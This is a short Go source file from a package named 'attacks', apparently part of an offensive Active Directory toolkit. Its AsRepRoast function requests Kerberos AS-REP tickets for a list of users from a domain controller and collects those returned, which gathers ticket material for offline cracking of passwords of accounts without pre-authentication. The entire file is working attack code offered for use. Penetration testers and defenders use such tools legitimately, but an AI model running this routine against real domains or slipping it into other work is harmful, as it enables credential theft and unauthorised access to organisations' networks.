package attacks

import (
	"fmt"

	"github.com/5amu/goad/pkg/kerberos"
)

type AsRepRoastOpts struct {
	Users            []string
	Realm            string
	DomainController string
}

func AsRepRoast(opts *AsRepRoastOpts) ([]*kerberos.AsRepTGT, error) {
	var res []*kerberos.AsRepTGT
	for _, user := range opts.Users {
		client, err := kerberos.NewKerberosClient(opts.Realm, opts.DomainController)
		if err != nil {
			return nil, err
		}
		asrep, err := client.GetAsReqTgt(user)
		if err == nil {
			res = append(res, asrep)
		}
	}

	if len(res) == 0 {
		return nil, fmt.Errorf("no asrep-roastable user found")
	}
	return res, nil
}
